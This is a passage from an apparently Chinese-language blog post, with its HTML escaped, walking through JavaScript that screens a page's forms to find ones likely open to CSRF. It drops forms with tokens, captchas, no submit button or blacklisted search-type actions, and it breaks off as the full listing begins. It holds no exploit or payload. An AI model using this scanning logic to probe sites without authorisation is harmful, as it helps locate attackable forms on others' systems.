class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(actionCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;如果对some函数不明白的，请移步：&lt;a href=&quot;https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94&quot; target=&quot;_blank&quot; rel=&quot;external&quot;&gt;https://msdn.microsoft.com/zh-cn/library/ff679978(v=vs.94).aspx&lt;/a&gt;.aspx)&lt;br&gt;而在JavaScript里是严格区分大小写的，所以在上面的代码中我使用了toLowerCase()函数，来把action里的值全部转化成小写，然后在其中搜索之前设置的action黑名单，看是否存在。而对比过程如下:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;action的值–search（如果此次比对为true，则不会向下进行比对）&lt;/p&gt;
&lt;p&gt;action的值–find&lt;/p&gt;
&lt;p&gt;……&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;其返回的结果是布尔型。在《JavaScript高级程序设计》里是这样说明some函数的:&lt;/p&gt;
&lt;p&gt;&lt;code&gt;对数组中的每一项运行给定函数，如果该函数对任意一项返回true，则返回true。&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这个时候我们可以看到some前面有一个变量。因为some返回的是布尔型，那么actionCheck变量也是一个布尔型，假设当前这个form表单里的action的值为”/searchArticle.php”。那么就会匹配到黑名单里的search字符串，那么some就会停止向下循环，直接返回true。&lt;br&gt;如下图：&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://7xppwd.com1.z0.glb.clouddn.com/CSRF/img/3.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;然后使用if判断&lt;code&gt;actionCheck&lt;/code&gt;变量。如果为true，那么就使用&lt;code&gt;continue&lt;/code&gt;来跳出当前的循环，不向下运行，直接开始下一个循环。&lt;/p&gt;
&lt;p&gt;OK,上面的已经完成对form的action属性过滤了，那么下面的将对input进过白名单过滤。&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; x = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;x &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).length;x++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputTextCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; inputText =  formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:text&quot;&lt;/span&gt;).eq(x);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;) == &lt;span class=&quot;literal&quot;&gt;undefined&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先使用&lt;code&gt;(&amp;quot;:text&amp;quot;)&lt;/code&gt;来遍历当前form表单下所有type为text的input标签。&lt;/p&gt;
&lt;p&gt;inputTextCheck变量是为了存放some函数的布尔结果。而inputText变量代表了当前的input标签。&lt;/p&gt;
&lt;p&gt;然后使用if判断当前input里的placeholder属性是否存在，如果不存在，则跳出初始化表达式变量为x的本次循环。不向下运行，且对下一个input标签进行之前的操作。如果存在且有值的话，if里的表达式会返回false。则这个if判断不会运行，而是向下运行，而代码：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;inputTextCheck = placeholderFilterKeyword.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (inputText.attr(&lt;span class=&quot;string&quot;&gt;&quot;placeholder&quot;&lt;/span&gt;).toLowerCase().indexOf(item)  != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(inputTextCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;和之前判断action的情况的是一样的，这里就不在阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x03-去除没有提交按钮的form表单：&quot;&gt;&lt;a href=&quot;#0x03-去除没有提交按钮的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x03 去除没有提交按钮的form表单：&quot;&gt;&lt;/a&gt;0x03 去除没有提交按钮的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;为什么要写这个，因为有些form表单不是给用户使用的，他没有提交按钮。对用户来说也是不可见状态。而且也不涉及较为核心的操作，那么我们就需要把这个表单剔除掉。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:submit&quot;&lt;/span&gt;).length &amp;lt; &lt;span class=&quot;number&quot;&gt;1&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;这段代码较为简单，这里也不在阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x04-去除具有token的form表单：&quot;&gt;&lt;a href=&quot;#0x04-去除具有token的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x04 去除具有token的form表单：&quot;&gt;&lt;/a&gt;0x04 去除具有token的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;大家都知道对于CSRF来说，具有token的form表单基本是可以断定是不存在CSRF漏洞的了，当然排除同页面存在XSS漏洞和CSRF漏洞。&lt;/p&gt;
&lt;p&gt;而token，我们应该怎么样发现呢？type为hidden？name包含token？，不不不。这些都不准确，没办法减少误报和扩大结果。那我们应该怎么做呢？&lt;b&gt;判断type为hidden的input标签里的value值的长度是否大于10&lt;/b&gt;。&lt;/p&gt;
&lt;p&gt;具有token功能的input标签的特殊性：&lt;/p&gt;
&lt;blockquote&gt;
&lt;ol&gt;
&lt;li&gt;&lt;p&gt;type为hidden&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;为了安全起见，token一般是不会小于10位数的。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;&lt;p&gt;总是以input标签为媒介的方式传输给后端服务器中。&lt;/p&gt;
&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;OK,那么我们可以遍历当前form表单下所有type为hidden的input标签，再判断value值是否大于10。如果大于10，说明这个表单很大程度上是具有token验证的表单，将会被程序丢弃。跳出初始化表达式变量为i的本次循环。把上面的话转化成代码就是下面这样：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; j = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;j &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).length;j++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;:hidden&quot;&lt;/span&gt;).eq(j).val().length &amp;gt; &lt;span class=&quot;number&quot;&gt;10&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;程序不复杂，复杂的思路。所以这里看起来代码其实也了没多少，而且相当的简单。所以这里就不对代码进行阐述了。&lt;/p&gt;
&lt;h4 id=&quot;0x05-去除带有验证码的form表单：&quot;&gt;&lt;a href=&quot;#0x05-去除带有验证码的form表单：&quot; class=&quot;headerlink&quot; title=&quot;0x05 去除带有验证码的form表单：&quot;&gt;&lt;/a&gt;0x05 去除带有验证码的form表单：&lt;/h4&gt;&lt;hr&gt;
&lt;p&gt;有了之前写自动化检测XSS项目的经验，这里思路就清晰多了。获取img的src属性里的值，判断后缀是否为图片格式。代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length &amp;gt; &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imageCheck;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; z = &lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;;z &amp;lt; formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).length;z++)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; img = formDom.find(&lt;span class=&quot;string&quot;&gt;&quot;img&quot;&lt;/span&gt;).eq(z);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; imgSrc = img.attr(&lt;span class=&quot;string&quot;&gt;&quot;src&quot;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!!imgSrc)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&lt;span class=&quot;string&quot;&gt;&quot;.&quot;&lt;/span&gt;),imgSrc.length);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            imageCheck = imageFileSuffix.some(&lt;span class=&quot;function&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;function&lt;/span&gt;(&lt;span class=&quot;params&quot;&gt;item,index&lt;/span&gt;)&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;return&lt;/span&gt; (imgSrc == item);&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;)&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(!imageCheck)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;                &lt;span class=&quot;keyword&quot;&gt;continue&lt;/span&gt; outerFor;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;首先使用&lt;code&gt;formDom.find(&amp;quot;img&amp;quot;).length&lt;/code&gt;来判断当前的form表单里是否存在图片，如果存在，那么if判断会返回true。进入if判断里面后，首先是一个变量，而这个变量是存放some函数返回的布尔结果的。&lt;/p&gt;
&lt;p&gt;然后就是一个for循环，对当前form表单里的img表单进行遍历。而变量&lt;code&gt;img&lt;/code&gt;代表了当前的img标签。而imgSrc变量代表了当前img标签里的src。&lt;/p&gt;
&lt;p&gt;下面是一段if代码&lt;code&gt;if(!!imgSrc)&lt;/code&gt;为什么要这样写呢，是强制把imgSrc变量转成布尔型的，如果当前这个img标签是不存在src属性或没有值的情况下，将会返回false，如果存在src且有值的情况下会返回true。&lt;/p&gt;
&lt;p&gt;而下面的代码的是为了剔除&lt;code&gt;?&lt;/code&gt;后面的字符串：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;if&lt;/span&gt;(imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;) != &lt;span class=&quot;string&quot;&gt;&quot;-1&quot;&lt;/span&gt;)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;    imgSrc = imgSrc.slice(&lt;span class=&quot;number&quot;&gt;0&lt;/span&gt;,imgSrc.indexOf(&lt;span class=&quot;string&quot;&gt;&quot;?&quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;为什么要写这样的代码呢？原因很简单，未来防止验证码图片被浏览器缓存，需要再后面跟上问号和随机数字，来达到每刷新一次，就会重新请求这个图片。防止浏览器缓存图片。&lt;/p&gt;
&lt;p&gt;而&lt;code&gt;imgSrc = imgSrc.substr(imgSrc.lastIndexOf(&amp;quot;.&amp;quot;),imgSrc.length);&lt;/code&gt;这段代码是剔除，除了后缀之外所有的字符串。只保留后缀。举个例子，有段img标签是这样写的：&lt;br&gt;&lt;code&gt;&amp;lt;img src=&amp;quot;https://wwww.baidu.com/code.php?rand=458711541&amp;quot;&amp;gt;&lt;/code&gt;，而运行上面的代码后，结果只有&lt;code&gt;.php&lt;/code&gt;了，剩下的字符串已经被剔除掉了。&lt;/p&gt;
&lt;p&gt;而下面的some函数，和之前是一样的，不做阐述。只是if里面的表达式里多了一个&lt;code&gt;!取反&lt;/code&gt;感叹号。为什么要这样写呢。因为之前的都是黑名单的形式，而这里的白名单的形式，既然是相反的，那么就使用&lt;code&gt;!取反&lt;/code&gt;就行了。&lt;/p&gt;
&lt;h4 id=&quot;0x06-其他：&quot;&gt;&lt;a href=&quot;#0x06-其他：&quot; class=&quot;headerlink&quot; title=&quot;0x06 其他：&quot;&gt;&lt;/a&gt;0x06 其他：&lt;/h4&gt;&lt;p&gt;整套代码如下：&lt;br&gt;&lt;figure class=&quot;highlight javascript&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;60&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;outerFor:&lt;/span&gt;&lt;br&gt;&lt;span class=&quot;line&quot;&gt;&lt;span class=&quot;keyword&quot;&gt;for&lt;/span&gt;(&lt;span class=&quot;keyword&quot;&gt;var&lt;/span&gt; i = &lt;span 